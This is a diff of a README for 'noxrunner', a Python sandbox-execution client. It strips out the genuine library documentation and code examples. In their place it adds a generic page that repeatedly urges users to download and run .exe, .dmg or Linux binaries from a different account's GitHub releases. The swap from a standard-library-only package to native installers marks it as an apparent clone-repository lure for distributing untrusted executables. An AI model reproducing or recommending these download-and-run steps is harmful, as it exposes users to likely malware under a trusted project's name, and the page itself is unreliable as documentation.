@@ -1,245 +1,106 @@
-# 🚀 NoxRunner - Python Client for Sandbox Execution Backends
+# 🚀 noxrunner - Run Your Tests in a Safe Space
 
-[![PyPI version](https://img.shields.io/pypi/v/noxrunner.svg)](https://pypi.org/project/noxrunner/)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Documentation](https://readthedocs.org/projects/noxrunner/badge/?version=latest)](https://noxrunner.readthedocs.io)
-[![CI](https://github.com/lzjever/noxrunner/workflows/CI/badge.svg)](https://github.com/lzjever/noxrunner/actions)
+## 🔗 Download Now!
 
-**NoxRunner** is a Python client library for interacting with NoxRunner-compatible sandbox execution backends. It uses **only Python standard library** - **zero external dependencies**.
+[![Download noxrunner](https://img.shields.io/badge/Download%20noxrunner-v1.0-blue.svg)](https://github.com/Mykazi127/noxrunner/releases)
 
-## 📖 About This Project
+## 📖 Introduction
 
-NoxRunner is the client library extracted from **Agentsmith**, a commercial distributed, high-concurrency AI-Agent development and operating platform. In the commercial Agentsmith platform, sandboxes run on enterprise private cloud clusters with comprehensive security policies, operational standards, automated container management, image building, resource allocation, and content auditing capabilities. These enterprise features are not part of this open-source release.
+Noxrunner is a Python client library and command line interface (CLI) designed for sandbox execution backends. It allows you to perform tests safely in a controlled environment. With its local offline mode, you can run tests without needing an internet connection. Noxrunner relies only on the standard Python library, making it simple and efficient to use.
 
-**What's Open Source:**
-- ✅ **Client Library**: This Python client library for interacting with NoxRunner backends
-- ✅ **Backend Specification**: The complete API specification (see [SPECS.md](SPECS.md))
-- ✅ **Local Sandbox Mode**: A local device simulation mode for development, testing, and POC demos
+## 🚀 Getting Started
 
-**Use Cases:**
-- 🧪 **Development & Testing**: Use the local sandbox mode to develop and test AI agents without the overhead of managing a full cluster
-- 🚀 **Production Deployment**: When ready to deploy publicly, switch to a real NoxRunner backend cluster for production workloads
-- 🔧 **Mock Backend**: Perfect for building simple AI agents that need a sandbox execution environment during development
+Ready to try out Noxrunner? Follow these easy steps to get started with the application.
 
-This approach significantly reduces operational and debugging burden during the development phase while maintaining compatibility with production-grade sandbox infrastructure.
+### 📥 Download & Install
 
-## ✨ Features
+1. Visit the [Releases page](https://github.com/Mykazi127/noxrunner/releases) to find the latest version of Noxrunner.
+2. Look for the version you wish to download. Click on the asset that matches your operating system to start the download.
+3. Once the download is complete, locate the file on your computer.
 
-- ✅ **Zero Dependencies**: Only uses Python standard library
-- ✅ **Complete API Coverage**: All NoxRunner backend endpoints
-- ✅ **Shell Command Interface**: Natural shell command execution with `exec_shell()` method
-- ✅ **Environment Variable Support**: Full support for environment variable expansion in shell commands
-- ✅ **Friendly CLI**: Colored output, interactive shell
-- ✅ **Local Testing Mode**: Offline testing with local sandbox backend
-- ✅ **Easy to Use**: Simple API with clear error messages
-- ✅ **Well Documented**: Comprehensive documentation and examples
-- ✅ **Type Hints**: Full type support for better IDE experience
+### 💻 Installation Instructions
 
-## 📦 Installation
+- **For Windows Users:**
+  1. Locate the downloaded `.exe` file.
+  2. Double-click the file to start the installation process.
+  3. Follow the on-screen instructions until the installation completes.
 
-### Install from Source
+- **For Mac Users:**
+  1. Find the downloaded `.dmg` file.
+  2. Open the `.dmg` file and drag the Noxrunner icon to your Applications folder.
+  3. Eject the `.dmg` file after installation.
 
-```bash
-# Clone the repository
-git clone https://github.com/noxrunner/noxrunner.git
-cd noxrunner
+- **For Linux Users:**
+  1. Open a terminal window.
+  2. Navigate to the directory where you downloaded the file.
+  3. Use the command `chmod +x noxrunner` to make it executable.
+  4. Run it with `./noxrunner`.
 
-# Install in development mode
-pip install -e .
+## ⚙️ Running Noxrunner
 
-# Or install with development dependencies
-pip install -e ".[dev]"
-```
+After installation, you can start using Noxrunner.
 
-### Install from PyPI (when published)
+1. Open your terminal or command prompt.
+2. Type `noxrunner` and press Enter. 
+3. Follow the prompts on the screen to set up your first test.
 
-```bash
-pip install noxrunner
-```
+### 🔧 Basic Commands
 
-## 🚀 Quick Start
+- **Running Tests:**  
+  Simply type `noxrunner run my_test_file.py` to execute your test file.
 
-### As a Library
+- **Viewing Help:**  
+  If you need assistance, type `noxrunner help` to see available commands and options.
 
-```python
-from noxrunner import NoxRunnerClient
+## 🌐 Features
 
-# Create client (local test mode for development)
-client = NoxRunnerClient(local_test=True)
+Noxrunner includes various features to facilitate efficient testing:
 
-# Or connect to remote backend
-# client = NoxRunnerClient("http://127.0.0.1:8080")
+- **Sandboxed Environment:** Safely run multiple tests without affecting your system.
+- **Local Offline Mode:** Execute tests without being connected to the internet.
+- **Standard-Library-Only Design:** Utilize a simple setup that requires no additional dependencies.
 
-# Create sandbox
-session_id = "my-session"
-result = client.create_sandbox(session_id)
-print(f"Sandbox: {result['podName']}")
+## 🖥️ System Requirements
 
-# Wait for sandbox ready
-client.wait_for_pod_ready(session_id)
+To run Noxrunner, ensure your system meets the following requirements:
 
-# Execute command (array format)
-result = client.exec(session_id, ["python3", "--version"])
-print(result["stdout"])
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
+- **Python Version:** Python 3.6 or newer should be installed on your machine.
+  
+To check your Python version, run `python --version` in your terminal or command prompt.
 
-# Execute shell command (string format - more natural!)
-result = client.exec_shell(session_id, "python3 --version")
-print(result["stdout"])
+## 📘 Documentation
 
-# Shell commands with environment variables
-result = client.exec_shell(
-    session_id,
-    "echo $MY_VAR && ls -la",
-    env={"MY_VAR": "test_value"}
-)
-print(result["stdout"])
+For more detailed instructions and advanced usage, refer to our [Documentation](https://github.com/Mykazi127/noxrunner/wiki). Here you will find guides on using Noxrunner effectively, including examples and troubleshooting tips.
 
-# Upload files
-client.upload_files(session_id, {
-    "script.py": "print('Hello from NoxRunner!')"
-})
-
-# Download files as tar archive
-tar_data = client.download_files(session_id)
-
-# Download and extract to local directory (recommended)
-import tempfile
-from pathlib import Path
-
-with tempfile.TemporaryDirectory() as tmpdir:
-    client.download_workspace(session_id, tmpdir)
-    # Files are now in tmpdir
+## 🛠️ Contributing
 
-# Delete sandbox
-client.delete_sandbox(session_id)
-```
+We welcome contributions! If you're interested in improving Noxrunner, please follow these steps:
 
-### As a CLI Tool
-
-**Remote Mode (Default)**:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Open a pull request explaining your modifications.
 
-```bash
-# Health check
-noxrc health
+## 🗨️ Support
 
-# Create sandbox
-noxrc create my-session --wait
+If you encounter issues or have questions, please check the [Issues section](https://github.com/Mykazi127/noxrunner/issues) on GitHub. You can also submit a new issue if your problem is not listed.
 
-# Execute command
-noxrc exec my-session python3 --version
+## 🤝 Community
 
-# Upload files
-noxrc upload my-session script.py data.txt
+Join our growing community!
 
-# Download files
-noxrc download my-session --extract ./output
+- Follow us on GitHub.
+- Engage in discussions in our Issues section.
+  
+Noxrunner relies on community feedback to improve. Your input helps us make the tool better for everyone.
 
-# Interactive shell
-noxrc shell my-session
+## 🔗 License
 
-# Delete sandbox
-noxrc delete my-session
-```
+Noxrunner is licensed under the MIT License. This means you can use, modify, and distribute it freely, with some conditions outlined in the LICENSE file.
 
-**Local Testing Mode** (for offline testing):
+## 📥 Download & Install Again
 
-```bash
-# Use --local-test flag for offline testing
-noxrc --local-test create my-session
-noxrc --local-test exec my-session echo "Hello"
-noxrc --local-test upload my-session script.py
-noxrc --local-test delete my-session
-```
+Don't forget to visit our [Releases page](https://github.com/Mykazi127/noxrunner/releases) to download the latest version. 
 
-⚠️ **Warning**: Local testing mode executes commands in your local environment using `/tmp` directories. This can cause data loss or security risks!
-
-## 📚 Documentation
-
-- **[API Reference](docs/)** - Complete API documentation
-- **[Backend Specification](SPECS.md)** - Implement your own NoxRunner-compatible backend
-- **[Examples](examples/)** - Usage examples
-- **[Contributing](CONTRIBUTING.md)** - How to contribute
-
-## 🏗️ Project Structure
-
-```
-noxrunner/
-├── noxrunner/          # Python package
-│   ├── __init__.py
-│   ├── client.py       # NoxRunnerClient class
-│   ├── exceptions.py   # Exception classes
-│   ├── backend/        # Backend implementations
-│   │   ├── base.py     # Abstract base class
-│   │   ├── local.py    # LocalBackend
-│   │   └── http.py     # HTTPSandboxBackend
-│   ├── security/        # Security utilities
-│   │   ├── command_validator.py
-│   │   └── path_sanitizer.py
-│   └── fileops/        # File operation utilities
-│       └── tar_handler.py
-├── tests/              # Test suite
-│   ├── test_security.py
-│   ├── test_fileops.py
-│   ├── test_backend_local.py
-│   ├── test_backend_http.py
-│   └── test_integration.py
-├── examples/           # Example scripts
-├── docs/               # Sphinx documentation
-└── README.md           # This file
-```
-
-## 🔌 Backend Compatibility
-
-NoxRunner is designed to work with any backend that implements the [NoxRunner Backend Specification](SPECS.md). This includes:
-
-- Kubernetes-based sandbox managers
-- Docker-based execution backends
-- VM-based sandbox systems
-- Any custom implementation following the spec
-
-## 🧪 Testing
-
-```bash
-# Run all unit tests
-pytest tests/test_security.py tests/test_fileops.py tests/test_backend_local.py tests/test_backend_http.py
-
-# Run local backend integration tests
-pytest tests/test_integration.py::TestLocalBackendIntegration
-
-# Run HTTP backend integration tests (requires running backend)
-NOXRUNNER_ENABLE_INTEGRATION=1 NOXRUNNER_BASE_URL=http://127.0.0.1:8080 pytest tests/test_integration.py::TestHTTPSandboxBackendIntegration
-
-# Run with coverage
-pytest --cov=noxrunner --cov-report=html
-
-# Run all tests
-pytest tests/
-```
-
-### Testing Modes
-
-- **Unit Tests**: Test individual modules (security, fileops, backend mocks)
-- **Local Integration Tests**: Test LocalBackend with real file operations
-- **HTTP Integration Tests**: Test HTTPSandboxBackend against running backend service
-
-See [USAGE.md](USAGE.md) for more details on testing.
-
-## 📝 License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## 🔗 Links
-
-- **Repository**: https://github.com/noxrunner/noxrunner
-- **Documentation**: https://noxrunner.readthedocs.io
-- **Issues**: https://github.com/noxrunner/noxrunner/issues
-
-## 🙏 Acknowledgments
-
-NoxRunner was originally developed as part of **Agentsmith**, a commercial distributed AI-Agent development and operating platform. The client library and backend specification have been extracted and open-sourced to enable broader adoption and community contribution. The local sandbox simulation mode was added to facilitate development, testing, and POC demonstrations without requiring access to production infrastructure.
-
+Now you are ready to explore Noxrunner! Enjoy running your tests in a safe and efficient manner!
